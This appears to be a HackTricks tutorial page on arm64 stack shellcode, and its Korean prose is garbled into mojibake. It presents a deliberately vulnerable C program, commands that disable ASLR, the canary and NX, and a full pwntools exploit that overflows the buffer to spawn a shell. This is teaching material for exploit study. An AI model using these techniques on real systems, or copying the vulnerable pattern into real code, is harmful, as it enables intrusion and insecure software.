# ìŠ¤íƒ ì‰˜ì½”ë“œ - arm64

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”**.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

[arm64 ê¸°ë³¸ ì–´ì…ˆë¸”ë¦¬.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)ì—ì„œ arm64ì— ëŒ€í•œ ì†Œê°œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì½”ë“œ&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
íŒŒì´, ìºë„ˆë¦¬, NX ì—†ì´ ì»´íŒŒì¼í•˜ê¸°:

{% code overflow="wrap" %}
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```
## ASLR ì—†ìŒ & canary ì—†ìŒ - ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš°

ASLRì„ ì¤‘ì§€í•˜ë ¤ë©´ ì‹¤í–‰í•˜ì„¸ìš”:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
[**bof ì˜¤í”„ì…‹ì„ ì–»ìœ¼ë ¤ë©´ ì´ ë§í¬ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤**](../ret2win/ret2win-arm64.md#finding-the-offset).

Exploit:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```
ë‹¤ìŒìœ¼ë¡œ í˜¸ì¶œí•  ìŠ¤íƒ ë‚´ ì£¼ì†Œë¥¼ ì°¾ëŠ” ê²ƒì´ ìœ ì¼í•˜ê²Œ "ë³µì¡"í•  ìˆ˜ ìˆëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ì œ ê²½ìš° gdbë¥¼ ì‚¬ìš©í•˜ì—¬ ì°¾ì€ ì£¼ì†Œë¡œ exploitì„ ìƒì„±í–ˆì§€ë§Œ, exploitì„ ì‹œë„í•  ë•Œ ì‘ë™í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤ (ìŠ¤íƒ ì£¼ì†Œê°€ ì•½ê°„ ë³€ê²½ë˜ì—ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤).

ìƒì„±ëœ **`core` íŒŒì¼** (`gdb ./bog ./core`)ì„ ì—´ê³  ì‰˜ì½”ë“œ ì‹œì‘ ì£¼ì†Œì˜ ì‹¤ì œ ì£¼ì†Œë¥¼ í™•ì¸í–ˆìŠµë‹ˆë‹¤.
